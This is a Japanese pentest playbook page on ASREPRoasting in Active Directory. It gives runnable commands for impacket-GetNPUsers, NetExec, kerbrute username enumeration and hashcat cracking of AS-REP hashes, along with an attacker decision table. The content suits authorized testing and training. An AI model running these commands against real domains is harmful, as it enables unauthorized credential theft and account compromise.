# ASREPRoasting

## 概要

Kerberos の事前認証（Pre-Authentication）が無効化されているアカウントは、認証情報なしで AS-REP メッセージを取得できる。この AS-REP はアカウントのパスワードで暗号化されているため、オフラインでクラックできる。

---

## 着火条件

**ケース A（最小条件）— ユーザー名が 1 名だけ判明している**

- メタデータ解析（exiftool）・PDF 内文字列・メール文面等から **特定のユーザー名が 1 名だけ判明**した
- 認証情報は不要。そのユーザー 1 名に対して即試せる

**ケース B — ユーザーリストが入手できている**

- LDAP 匿名バインド・RID bruteforce・SMB 列挙等でユーザーリストを作成済み

**どちらのケースも認証情報が不要**なため、初期アクセス前から試せる。事前認証無効のアカウントは通常設定ではなく、意図的または誤設定で存在している。古い Kerberos クライアントとの互換性確保のために設定されることがある。

---

## 観点・着眼点

**攻撃者の思考トレース：** 「ユーザー名が 1 名でもわかったら、まず ASREPRoasting を試す」。ハッシュが返ってきた場合はオフラインクラックに回し、クラック待ちの間に SMB 列挙や他の情報収集を並行して進める。

**何が出たら次に何をするか：**

| 出力 | 示唆 | 次のアクション |
|------|------|--------------|
| `$krb5asrep$23$[USER]@[DOMAIN]:...` のハッシュが返る | 事前認証無効。オフラインクラック可能 | ハッシュを hashcat `-m 18200` に渡す（次のセクション）|
| `UF_DONT_REQUIRE_PREAUTH` なしのエラー | そのユーザーは事前認証が有効 | 他のユーザーを試すか手法を変える |
| `KDC_ERR_C_PRINCIPAL_UNKNOWN` | ユーザー名が存在しない | ユーザー名の形式を変えて再試行（Firstname.Lastname / FLastname 等）|
| 複数ユーザー分のハッシュが返る | 複数アカウントが事前認証無効 | 全ハッシュをまとめてクラックに回す |

---

## 手順

### ケース A: ユーザー名 1 名のみで試す（ユーザーリスト不要）

```bash
# [Attacker] 単一ユーザー名に対して直接試す
impacket-GetNPUsers \
  '[DOMAIN]/[USERNAME]' \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat \
  -outputfile asrep_hashes.txt

# 例（ドメインと IP を置換）
# impacket-GetNPUsers 'example.local/john.doe' -no-pass -dc-ip 192.0.2.10 -format hashcat
```

> **ユーザー名の形式が不明な場合：** まず `Firstname.Lastname` 形式を試し、`KDC_ERR_C_PRINCIPAL_UNKNOWN` が返ったら別形式に変える。形式候補: `FLastname`・`FirstnameL`・`firstname`・`lastname`。

### ケース B: ユーザーリストを使った一括確認

```bash
# [Attacker] ユーザーリストファイル（1行1ユーザー名）を用意してから実行
impacket-GetNPUsers \
  '[DOMAIN]/' \
  -usersfile users.txt \
  -no-pass \
  -dc-ip [DC_IP] \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### 認証済みユーザーで全アカウントを確認

```bash
# [Attacker] 認証情報が手に入ったら全アカウントを一括スキャン
impacket-GetNPUsers \
  '[DOMAIN]/[USER]:[PASSWORD]' \
  -dc-ip [DC_IP] \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

### NetExec を使用（認証情報あり）

```bash
nxc ldap [DC_IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.txt
```

---

## ユーザーリストの作成（認証情報がない場合）

**Kerbrute でユーザーを列挙：**
```bash
kerbrute userenum \
  --dc [DC_IP] \
  -d [DOMAIN] \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o valid_users.txt
```

> `kerbrute`（Go製のKerberos列挙ツール）は Kerberos プロトコルを使ってユーザーの存在確認をする。`KDC_ERR_PREAUTH_REQUIRED` が返れば「ユーザーは存在するが事前認証が有効」、`KDC_ERR_C_PRINCIPAL_UNKNOWN` は「ユーザーが存在しない」を意味する。

**一般的な AD ユーザー名の形式：**
```
administrator
guest
[firstname].[lastname]    ← 最多。まずこれを試す
[f][lastname]
[firstname][l]
```

---

## ハッシュのクラック

取得したハッシュ（`$krb5asrep$23$...` 形式）を hashcat でクラック：

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

→ 詳細: `../../05_Tools_Reference/Hashcat.md`

---

## 注意点・落とし穴

- 失敗した場合（`UF_DONT_REQUIRE_PREAUTH` が設定されたアカウントなし）は潔く諦める。無理に試行を繰り返すとアカウントロックのリスクがある
- ユーザーリストが不正確だと偽陰性が多くなる

---

## 関連技術
- 前：`../../01_Reconnaissance/LDAP_Enumeration.md`（ユーザー列挙）
- 後：`../../05_Tools_Reference/Hashcat.md`（ハッシュのクラック）
- 関連：`./Kerberoasting.md`（認証情報が必要な類似手法）
